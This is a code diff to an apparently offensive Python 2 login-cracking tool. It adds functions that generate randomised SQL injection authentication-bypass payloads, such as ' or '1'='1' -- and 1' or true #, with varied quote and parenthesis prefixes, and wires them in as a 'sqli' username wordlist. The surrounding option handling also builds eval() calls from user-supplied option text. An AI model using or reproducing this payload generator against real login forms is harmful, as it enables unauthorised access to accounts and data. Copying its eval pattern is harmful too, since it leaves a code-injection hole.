@@ -24,6 +24,50 @@ from utils import die
 # 	elif type(objInputData) == str:
 # 		return len(objInputData.split('\n'))
 
+def truecon():
+	# Generate true condition of SQL query
+	"""
+	Equal:
+		' or '1'='1' -- --
+	Static:
+		1' or not false #
+		1' or true #
+	Compare:
+		1' or 12 rlike 12 #
+		2' or '2'>'0' -- --
+		2' or 2>0 -- --
+	"""
+	# Payload template: ['or' | '||'] [condition] 
+	def cCon():
+		return randomFromList(["or", "||"])
+	def sCon():
+		conType = randomFromList(["equal", "static"])#, "compare"])
+		# Could be faster than create a dict and call element from dict
+		if conType == "static":
+			return randomFromList(["not false", "true"])
+		# elif conType == "compare":
+		# 	pass
+		elif conType == "equal":
+			genType = randomFromList(["char", "dig"])
+			_stri = srand(min = 3, max = 5, stype = genType)
+			if genType == "char":
+				return "'%s'='%s'" %(_stri, _stri)
+			elif genType == "dig":
+				return "%s=%s" %(_stri, _stri)
+
+	return "%s %s" %(cCon(), sCon())
+
+def sPayload():
+	def sEnd():
+		return randomFromList(["-- --", "#"])
+	# Generate random SQL injection payload
+	# Payload template: [X / X' / X')] [True condition] [-- / #]
+
+	fchar = ["", "'", ")", "')", "'))", "))"]
+
+	for pchar in fchar:
+		yield "%s %s %s" %(pchar, truecon(), sEnd())
+
 def randomFromList(listData):
 	return random.choice(listData)
 
@@ -93,9 +137,14 @@ def fwrite_c(pathFileLocation, writeData):
 	finally:
 		fileWrite.close()
 
-def randomString(min = 2, max = 5):
-	#https://stackoverflow.com/a/2257449
-	charset = string.lowercase + string.uppercase
+def srand(min = 2, max = 5, stype = "char"):
+	# https://stackoverflow.com/a/2257449
+	if stype == "char":
+		charset = string.letters
+	elif stype == "dig":
+		charset = string.digits
+
+	min, max = 0, random.randint(min, max)
 	return ''.join(random.choice(charset) for _ in xrange(min, max))
 
 
@@ -155,7 +204,10 @@ def check_options(options, loginInfo):
 		options.username = list(set(lread(options.options["-U"])))
 	else:
 		if options.options["-u"] in options.WORDLISTS:
-			options.username = eval("data.%s_user()" %(options.options["-u"])).replace("\t", "").split("\n")
+			if options.options["-u"] == "sqli":
+				options.username = eval("list(data.%s_user())" %(options.options["-u"]))
+			else:
+				options.username = eval("data.%s_user()" %(options.options["-u"])).replace("\t", "").split("\n")
 		else:
 			options.username = fread(options.options["-u"]).split("\n")
 			options.username = filter(None, options.username)
